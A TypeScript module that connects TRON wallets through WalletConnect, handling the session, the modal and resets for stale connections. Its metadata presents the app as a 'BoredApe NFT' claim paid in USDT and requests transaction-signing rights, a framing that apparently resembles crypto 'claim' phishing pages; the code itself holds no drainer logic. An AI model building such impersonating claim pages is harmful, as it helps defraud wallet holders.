import type { WalletConnectModal } from "@walletconnect/modal";
import { UniversalProvider } from "@walletconnect/universal-provider";

export const PROJECT_ID = process.env.NEXT_PUBLIC_WALLETCONNECT_PROJECT_ID || "";

let provider: InstanceType<typeof UniversalProvider> | null = null;
let modal: WalletConnectModal | null = null;
let displayUriListenerAttached = false;

function attachProviderListeners(wcProvider: InstanceType<typeof UniversalProvider>) {
  if (displayUriListenerAttached) return;
  wcProvider.on("display_uri", (uri: string) => {
    if (modal) {
      modal.openModal({ uri });
    }
  });
  wcProvider.on("session_delete", () => {
    modal?.closeModal();
  });
  displayUriListenerAttached = true;
}

export async function initWalletConnect() {
  if (provider) return provider;

  if (typeof window === "undefined") throw new Error("Browser only");

  if (!PROJECT_ID) throw new Error("Missing PROJECT_ID");

  provider = await UniversalProvider.init({
    projectId: PROJECT_ID,
    metadata: {
      name: "Ape NFT Claim",
      description: "Claim your exclusive BoredApe NFT with USDT",
      url: window.location.origin,
      icons: ["https://avatars.githubusercontent.com/u/37784886"],
    },
    relayUrl: "wss://relay.walletconnect.com", // or Reown's relay if preferred
  });

  if (!modal) {
    const { WalletConnectModal } = await import("@walletconnect/modal");
    modal = new WalletConnectModal({
      projectId: PROJECT_ID,
      // No need for chains here — handled in connect()
      themeMode: "dark",
      themeVariables: { "--wcm-z-index": "9999" },
      explorerRecommendedWalletIds: [
        "4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099efac1b2fd875da31a0",
      ],
    });
  }

  attachProviderListeners(provider);

  return provider;
}

export async function connectWalletConnect() {
  // If there's a stale provider with no active session, discard it so
  // initWalletConnect() creates a fresh one.  This prevents the
  // "Failed to publish custom payload … tag:undefined" relay error.
  if (provider) {
    const hasActiveSession =
      provider.session?.topic &&
      (provider.session?.namespaces?.tron?.accounts ?? []).length > 0;
    if (!hasActiveSession) {
      try { await provider.disconnect(); } catch { /* ignore */ }
      provider = null;
      displayUriListenerAttached = false;
    }
  }

  const wcProvider = await initWalletConnect();

  let session;
  try {
    session = await wcProvider.connect({
      optionalNamespaces: {
        tron: {
          chains: ["tron:0x2b6653dc"],
          methods: [
            "tron_signTransaction",
            "tron_signMessage",
            "tron_signMessageV2",
          ],
          events: ["chainChanged", "accountsChanged"],
        },
      },
    });
  } catch (error) {
    modal?.closeModal();
    // If the relay is in a bad state, reset everything so the next
    // attempt starts completely fresh.
    try { await wcProvider.disconnect(); } catch { /* ignore */ }
    provider = null;
    displayUriListenerAttached = false;
    throw error;
  }

  modal?.closeModal();
  if (!session) throw new Error("Failed to connect wallet");

  console.log("Connected TRON session:", session.namespaces.tron);
  return wcProvider;
}


export async function disconnectWalletConnect() {
  if (provider) {
    try { await provider.disconnect(); } catch { /* ignore */ }
    provider = null;
    displayUriListenerAttached = false;
  }
}

export function getWalletConnectProvider() {
  return provider;
}
